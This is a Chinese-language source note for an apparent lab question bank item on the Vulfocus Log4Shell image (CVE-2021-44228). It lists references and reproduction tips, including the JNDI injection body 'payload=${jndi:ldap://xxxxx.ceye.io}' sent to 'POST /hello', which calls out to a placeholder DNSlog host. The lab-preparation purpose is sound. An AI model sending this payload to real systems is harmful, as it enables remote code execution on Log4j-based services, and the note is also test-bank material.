# 第134题来源｜vulfocus/log4j2-rce-2021-12-09（校正 CVE-2021-44228）

## 题库字段（本地资料，不计外部来源数）

- 题名：`vulfocus/log4j2-rce-2021-12-09`
- 题库 CVE：空。按公开资料校正为 **CVE-2021-44228**（Log4Shell / Log4j 2 JNDI lookup）。与第133题 CVE-2021-4104 不是同一漏洞。
- 题库端口：`8080`

## 外部来源（4 个唯一链接）

### [S1] Vulfocus 镜像专项复现

- 链接：[浅谈最近闹得火热的 Log4j RCE 漏洞（博客园 LinkPoc）](https://www.cnblogs.com/Y0uhe/p/15675313.html)
- 用途：明确 `docker pull vulfocus/log4j2-rce-2021-12-09:latest`、`docker run -d -P ...`；Vulfocus 平台该镜像；HTTP 为 `POST /hello`，`Content-Type: application/x-www-form-urlencoded`，正文 `payload=${jndi:ldap://xxxxx.ceye.io}`，以 DNSlog 为成功信号。支撑步骤 1–2 与 `/hello`+`payload` 排坑。文中 Host 端口是平台映射，不等于题库内部 8080。

### [S2] Apache Log4j 官方安全页 — CVE-2021-44228

- 链接：[Apache Logging Services — Security #CVE-2021-44228](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44228)
- 用途：确认 Log4j 2 在配置/日志消息/参数中的 JNDI 可被攻击者控制的 LDAP 等终点利用；只影响 `log4j-core`；受影响 `[2.0-beta9, 2.15.0)` 等区间；修复 2.3.1 / 2.12.2 / 2.15.0。并写明 Log4j 1 无 Lookup、对应问题是 **CVE-2021-4104**。支撑 CVE 校正、与第133题区分、版本排坑。

### [S3] Docker Hub — vulfocus/log4j2-rce-2021-12-09

- 链接：[vulfocus/log4j2-rce-2021-12-09](https://hub.docker.com/r/vulfocus/log4j2-rce-2021-12-09)
- 用途：与题库镜像名一致；约 100K+ 拉取。无 overview。支撑镜像身份。

### [S4] Vulhub 同类 CVE 环境（入口不同）

- 链接：[Vulhub log4j/CVE-2021-44228 README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md)
- 用途：说明 Log4j 2.0–2.14.1 的 `${jndi:ldap://...}` lookup 原理及 DNS 验证。该环境入口是 Solr `GET /solr/admin/cores?action=`、端口 8983，**不是**本题 `/hello`。只支撑原理对照与“不要抄 Solr 路径”的排坑。
